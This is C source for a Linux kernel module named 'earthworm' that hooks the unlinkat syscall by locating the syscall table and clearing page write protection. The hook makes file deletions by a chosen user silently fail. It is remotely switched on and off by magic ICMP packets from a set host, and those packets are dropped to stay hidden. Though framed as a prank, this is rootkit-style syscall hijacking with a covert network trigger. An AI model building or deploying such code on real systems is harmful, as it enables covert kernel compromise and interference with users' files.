#include <linux/kernel.h>         /* No comment */
#include <linux/module.h>         /* No comment */
#include <linux/moduleparam.h>    /* Needed for passing parameters to kmodule */
#include <linux/init.h>           /* Custom naming of init end exit routines  */

#include <linux/sched.h>          /* syscalls stuff */
#include <asm/uaccess.h>          /* uid stuff */

#include <linux/netfilter.h>      /* NetFilter stuff */
#include <linux/netfilter_ipv4.h> /* NetFilter stuff */

#include <linux/skbuff.h>         /* Skew Buffers stuff */
#include <linux/ip.h>             /* IP stack stuff */
#include <linux/list.h>           /* Linked list implementation */

#include <linux/icmp.h>           /* ICMP header */

#include "common.h"               /* check    */
#include "earthworm.h"            /* yourself */
#include "syscall_table.h"        /* generated by bash script in compile-time */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivor Prebeg <ivor DOT prebeg AT gmail DOT com>");
MODULE_DESCRIPTION("earthworm - remote sys_call_table manipulation");

/* prototyping */
static int  __init earthworm_init(void);
static void __exit earthworm_exit(void);
#ifndef SYSCALL_EXPORTED
static void * find_sys_call_table(void);
#endif
static int alter_syscall_table_start(void);
static int alter_syscall_table_stop(void);
#ifdef NF
static int ew_register_new_rule(char * host,char * port);
static int validate_magic_packet(struct sk_buff *skb);
#endif
int make_rw(unsigned long address);
int make_ro(unsigned long address);

const char * modname = "ew";
static int ew_state = EW_STOP;
static int uid = 1000;

#define _7yp3_1337          111
#define _c0d3_1337_start    222 
#define _c0d3_1337_stop     221 

#ifdef SYSCALL_EXPORTED
extern void **sys_call_table;
#else
void **sys_call_table;
#endif

/* Network parameters to be filtered */
#ifdef NF
static char *port = NULL;
static char *host = NULL;
static struct ew_rules *tmp;
static struct ew_rules rules;
static struct list_head *pos,*q;
static struct nf_hook_ops nfho;

module_param(port,charp,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
module_param(host,charp,S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
#endif

/* function pointer saving location of original syscall */
asmlinkage int (*original_call)(int, const char *, int);

/* function making unlink very funny and confusing for user with uid */
asmlinkage int 
unlinkat_with_spy(int dirfd, const char *pathname, int flags)
{
  if (uid == current_uid())
	{
		printk(KERN_INFO "%s Dear user (uid=%d), removing file (%s) tickles me.",modname,current_uid(),pathname);
	}
	else 
	{
		printk(KERN_INFO "%s this user (uid=%d) is not to be pranked\n",modname,current_uid());
		return original_call(dirfd, pathname, flags);
	}
	return 0;
}

#ifdef NF
unsigned int 
hook_func(
	unsigned int hooknum,
	/* struct sk_buff **skb, */ //change
	struct sk_buff *skb,
	const struct net_device *in,
	const struct net_device *out,
	int (*okfn)(struct sk_buff *))
{
  int ret;
  
  //printk(KERN_INFO "%s %s, will validate magic packet now\n",modname, __func__);
  ret = validate_magic_packet (skb);
  //printk(KERN_INFO "%s %s, packet validated\n",modname, __func__);
  switch (ret) {
	/* Regular network traffic should not be interfered,
   * and magic packets should be discarded at earliest 
   * point of entering into the system. */
  case EW_NOMAGIC: 
    return NF_ACCEPT;
    /* NOTREACHED */
  case EW_START:
  	printk(KERN_INFO "%s %s, will alter syscall table (start)\n",modname, __func__);
	  alter_syscall_table_start();
  	printk(KERN_INFO "%s %s, altered syscall table (start)\n",modname, __func__);
    return NF_DROP;
    /* NOTREACHED */
  case EW_STOP:
  	printk(KERN_INFO "%s %s, will alter syscall table (stop)\n",modname, __func__);
	  alter_syscall_table_stop();
  	printk(KERN_INFO "%s %s, altered syscall table (stop)\n",modname, __func__);
    return NF_DROP;
    /* NOTREACHED */
  default:
    break;
  }

  return NF_ACCEPT; 
}
#endif

static int __init 
earthworm_init(void)
{
#ifdef NF
  if (host == NULL) {
    printk(KERN_INFO "%s must receive parameter.\n", modname);
    return FAILURE;
  }
#endif

#ifndef SYSCALL_EXPORTED
	if (( sys_call_table = find_sys_call_table())) {
  	printk( "%s discovered sys_call_table at %p.\n", modname, sys_call_table );
	}
#endif

#ifdef NF
  nfho.hook     = hook_func;         /* handler function */
  //nfho.hooknum  = NF_IP_PRE_ROUTING; /* first hook */ 
  nfho.hooknum  = 0; /* can't include that anymore, but part of ABI */ 
  nfho.pf       = PF_INET;
  nfho.priority = NF_IP_PRI_FIRST;   /* first us, then NetFilter*/

  nf_register_hook(&nfho);
  printk(KERN_INFO "%s registered nf hook.\n",modname);

  INIT_LIST_HEAD(&rules.list);
  printk(KERN_INFO "%s initialized rules list.\n",modname);

  ew_register_new_rule(host,port);
#else
  alter_syscall_table_start();
#endif
  return SUCCESS;
}

#ifdef NF
static int 
ew_register_new_rule(char * host, char * port)
{
  printk(KERN_INFO "%s adding new rule\n",modname);
  tmp       = (struct ew_rules*)kmalloc(sizeof(struct ew_rules),GFP_KERNEL);
  tmp->rule = (struct ew_rule *)kmalloc(sizeof(struct ew_rule ),GFP_KERNEL);

  tmp->rule->ip = host;
  tmp->rule->pt = port;
  tmp->rule->dr = IRELEVANT;

  list_add(&(tmp->list),&(rules.list));
  printk(KERN_INFO "%s added rule [rule:%p,node=%p].\n",modname, tmp->rule,tmp);
  return 0;
}
#endif

static int
alter_syscall_table_start(void)
{
	make_rw((unsigned long)sys_call_table);
  ew_state = EW_START;
  original_call = sys_call_table[__NR_unlinkat];
  sys_call_table[__NR_unlinkat] = unlinkat_with_spy;
	printk(KERN_INFO "%s altered sys_call_table.\n",modname);
	printk(KERN_INFO "%s reported real_unlinkat=%p, fake_unlinkat=%p\n",modname,original_call, sys_call_table[__NR_unlinkat]);
	make_ro((unsigned long)sys_call_table);
  return SUCCESS;
}

static int 
alter_syscall_table_stop(void)
{
	make_rw((unsigned long)sys_call_table);
  ew_state = EW_STOP;
	printk(KERN_INFO "%s restored sys_call_table.\n",modname);
  sys_call_table[__NR_unlinkat] = original_call;
	make_ro((unsigned long)sys_call_table);
  return SUCCESS;
}

#ifdef NF
static int 
validate_magic_packet(struct sk_buff *skb)
{
  uint8_t *c;
  uint32_t *icmp_data;
  struct iphdr *ip;
  struct icmphdr *icmp;
  char str[21];

  ip = (struct iphdr *)skb->data;
  c = (uint8_t *) &ip->saddr;
  icmp = (struct icmphdr *)((char*)ip + (ip->ihl << 2));
  icmp_data = (uint32_t *)((char *)icmp + 4);

  if (ip->protocol != IPPROTO_ICMP)
    return EW_NOMAGIC;

  memset(str,0,21);
  snprintf(str,20,"%u.%u.%u.%u",*(c),*(c+1),*(c+2),*(c+3));

  //printk(KERN_INFO "ip_proto = %d\n",ip->protocol);

  printk(KERN_INFO "%s got ICMP from %u.%u.%u.%u \n",modname,*(c),*(c+1),*(c+2),*(c+3));
  printk(KERN_INFO "%s is checking firewall rules:\n",modname);

  list_for_each(pos,&rules.list) {
    tmp = list_entry(pos,struct ew_rules, list);
    printk(KERN_INFO "\t[host=%s rule:%p,node=%p]\n",tmp->rule->ip, tmp->rule,tmp);
    if ( strncmp(tmp->rule->ip,str,20) != 0) {
      printk (KERN_INFO "\trule not matched\n");
      continue;
    }

    if (ip->protocol == IPPROTO_ICMP && icmp->type == _7yp3_1337) {
      printk(KERN_INFO "%s icmp %u %u %u %u\n", modname, icmp->type, icmp->code, icmp->checksum, *icmp_data );

      if (icmp->code == _c0d3_1337_start && ew_state == EW_STOP) {
        uid = *icmp_data;
        printk(KERN_INFO "%s changing prank_uid to %u\n", modname, uid);
        return EW_START;
      }   

      if (icmp->code == _c0d3_1337_stop  && ew_state == EW_START) {
        return EW_STOP;
      }
    }
  }

  return EW_NOMAGIC;
}
#endif


static void __exit 
earthworm_exit(void)
{
#ifdef NF
  nf_unregister_hook(&nfho);
  printk(KERN_INFO "%s unregistered nf hook.\n",modname);

  /* free all allocated slots of linked list */
  list_for_each_safe(pos,q,&rules.list) {
    tmp = list_entry(pos,struct ew_rules,list);
    printk(KERN_INFO "%s removed rule [rule:%p,node=%p].\n",modname, tmp->rule,tmp);
    list_del(pos);
    kfree(tmp->rule);
    kfree(tmp);
  }
#endif
  if (ew_state == EW_START)
	  alter_syscall_table_stop();
}

#ifndef SYSCALL_EXPORTED
static void * 
find_sys_call_table(void)
{
	return (void *)SYS_CALL_ADDRESS;
}
#endif

int make_rw(unsigned long address)
{  
	unsigned int level;
	pte_t *pte = lookup_address(address,&level);
	printk(KERN_INFO "%s changing address %lx to rw].\n",modname, address);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	printk(KERN_INFO "%s changed address %lx to rw].\n",modname, address);
	return 0;
}
 
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	printk(KERN_INFO "%s changing address %lx to ro].\n",modname, address);
	pte->pte = pte->pte &~ _PAGE_RW;
	printk(KERN_INFO "%s changed address %lx to ro].\n",modname, address);
	return 0;
}

module_init(earthworm_init);
module_exit(earthworm_exit);
